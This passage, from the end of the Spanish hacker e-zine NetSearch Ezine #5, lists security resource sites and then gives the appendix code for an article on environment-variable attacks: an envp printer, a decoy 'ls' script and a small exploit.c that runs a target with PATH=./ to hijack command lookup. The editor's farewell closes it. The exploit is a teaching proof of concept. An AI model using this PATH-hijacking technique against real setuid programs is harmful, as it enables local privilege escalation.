 en el campo de las nuevas tecnologias de la informacion.

 HispaSec publica de forma diaria una  news-letter con la noticia mas relevante
 del dia en el mundo de la seguridad informatica" (Hispasec)

JULIANOR. <http://julianor.tripod.com/>
Pagina con todo tipo de documentos sobre como escribir shellcodes.

NETSEARCH E-ZINE <http://www.netsearch-ezine.com/>
Magazine electronico espanyol dedicado a la seguridad informatica.

PACKETSTORM. <http://packetstorm.securify.com/>
"Packet Storm is the largest and most up to date library of information security information in the world."  (PacketStorm)

SECURITYFOCUS <http://www.securityfocus.com/>
Portal dedicado integramente a la seguridad informatica.

USSR LIBRARY. <http://www.ussrback.com/files.html>.
Libreria virtual con gran cantidad de documentos que tratan cualquier tema rela
cionado con la seguridad informatica.




*** APENDICE C: CODIGO

<++> code/env/muestra_env.c $dbbe486af967f1f6d3f164b85bc7b55c
#include <stdio.h>

int main(int argc, char **argv, char *envp[])
{
	int i=0;
	while (envp[i] != NULL)
	{
		fprintf(stdout,"%s\n",envp[i]);
		i++;
	}
	return(0);
}
<-->

<++> code/env/ls $82fbc3175f6c562a3b5c9e07ebfd3017
#!/bin/sh
echo "El exploit ha funcionado"
<-->

<++> code/env/exploit.c $5018efe30ba22e551d2ef95d8284c564
#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv)
{
	char *entorno[2];
	char *variable = "PATH=./";

	entorno[0] = variable;
	entorno[1] = NULL;

	if (argc < 2)
	{
		fprintf(stdout,"Formato: %s <archivo>\n",argv[0]);
		exit(-1);
	}

	execve(argv[1],NULL,entorno);
	return(0);
}
<-->



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x15 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Despedida ]-=============================================================
=-[ por Editor ]-============================================================
 
 
 
 
Hala, ya hemos terminado otro numero mas del NetSearch Ezine :). Nos gustaria
mucho saber las opiniones de la gente sobre que le parece el ezine, asi que
no os corteis y coger vuestro emailer apuntando a staff@netsearch-ezine.com
;). Opiniones, criticas, sugerencias.. todo es bienvenido.

Como os decia en la editorial, el plazo entre cada numero es posible que
aumente un poco, asi que calculando asi por lo alto NetSearch Ezine #6
llegara a mediados/finales de Junio. Pero no os preocupeis, ya que os
prometemos que la espera merecera la pena =). Aprovecho para mandarle desde
aqui un saludo a algunos como Aprendiz, que han estado trabajando duro y que
no se ha podido incluir su/s articulos por falta de tiempo [;)].
 
Pues nada, nos vemos en NS #6.. Durante este tiempo se ira colgando alguna
que otra informacion en nuestra web, visitarla de vez en cuando si quereis
estar informados de las ultimas novedades en torno a NetSearch, os recuerdo:
'http://www.netsearch-ezine.com'.
 
Hasta entonces, un saludo a tod@s.
 
 
El Editor



0x00
